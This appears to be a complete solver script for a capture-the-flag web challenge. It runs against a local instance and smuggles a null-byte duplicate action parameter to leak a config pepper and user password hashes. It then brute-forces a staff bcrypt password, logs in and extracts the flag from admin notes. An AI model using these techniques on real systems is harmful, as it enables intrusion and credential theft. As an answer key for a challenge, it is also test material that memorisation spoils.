#!/usr/bin/env python3
"""Solver for Mekanik Tua.

Walks all six stages against a live instance and prints the flag.

    pip install -r requirements.txt
    python solve.py http://localhost:8080
"""

import argparse
import multiprocessing
import re

import bcrypt
import requests

PRIMITIVE = "?action=list&action%00="
MALFORMED = "%C3%28"
KEYSPACE = 0x10000


def call(base, query, cookie=None):
    headers = {"Cookie": cookie} if cookie else {}
    response = requests.get(base + "/api" + query, headers=headers, timeout=15)
    return response.json()


def read_pepper(base):
    body = call(base, PRIMITIVE + "config&fields=app_pepper," + MALFORMED)
    return body["app_pepper"]


def read_staff_hash(base):
    users = call(base, PRIMITIVE + "users")["users"]
    staff = next(user for user in users if user["role"] == "staff")
    return staff["username"], staff["password_hash"]


def search(args):
    pepper, digest, start, stride = args
    digest = digest.encode()
    for index in range(start, KEYSPACE, stride):
        candidate = "adm-%04x" % index
        if bcrypt.checkpw((pepper + candidate).encode(), digest):
            return candidate
    return None


def crack(pepper, digest, jobs):
    with multiprocessing.Pool(jobs) as pool:
        shards = [(pepper, digest, shard, jobs) for shard in range(jobs)]
        for found in pool.imap_unordered(search, shards):
            if found:
                pool.terminate()
                return found
    return None


def staff_session(base, username, password):
    body = call(base, PRIMITIVE + "login&u=%s&p=%s" % (username, password))
    if not body.get("ok"):
        raise SystemExit("login rejected: %s" % body)
    return body["sid"]


def owner_notes(base, sid):
    return call(base, PRIMITIVE + "admin", cookie="api.sid=" + sid)["owner_notes"]


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("target", help="base URL of the instance, e.g. http://localhost:8080")
    parser.add_argument("--jobs", type=int, default=multiprocessing.cpu_count())
    args = parser.parse_args()
    base = args.target.rstrip("/")

    pepper = read_pepper(base)
    print("[1,2] pepper      %s (%d chars)" % (pepper, len(pepper)))

    username, digest = read_staff_hash(base)
    print("[3]   staff       %s  %s" % (username, digest))

    print("[4]   cracking    %d candidates on %d processes..." % (KEYSPACE, args.jobs))
    password = crack(pepper, digest, args.jobs)
    if not password:
        raise SystemExit("no candidate matched, check the pepper and the hash")
    print("[4]   password    %s" % password)

    sid = staff_session(base, username, password)
    print("[5]   session     %s" % sid)

    for note in owner_notes(base, sid):
        flag = re.search(r"[A-Za-z0-9_]+\{[^}]*\}", note["body"])
        if flag:
            print("[6]   flag        %s" % flag.group(0))
            return

    raise SystemExit("no flag found in the owner notes")


if __name__ == "__main__":
    main()
